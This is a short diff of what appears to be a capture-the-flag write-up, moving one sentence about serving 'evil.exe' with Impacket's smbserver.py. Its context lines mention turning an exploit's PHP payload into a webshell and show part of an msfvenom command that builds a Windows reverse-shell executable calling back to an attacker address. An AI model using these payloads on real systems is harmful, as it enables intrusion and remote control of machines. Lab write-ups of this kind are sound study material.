@@ -100,8 +100,6 @@ So I'm able to modify the exploit accordingly
 
 I changed the php payload to a webshell, that's executable from the created page sh1n0bi.php.
 
-Rather than upload the evil.exe I can serve it to the target with Impacket's smbserver.py
-
 
 
 
@@ -115,6 +113,7 @@ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.16 lport=443 -f exe -e x86/
 
 ```
 
+Rather than upload the evil.exe I can serve it to the target with Impacket's smbserver.py
 
 
 
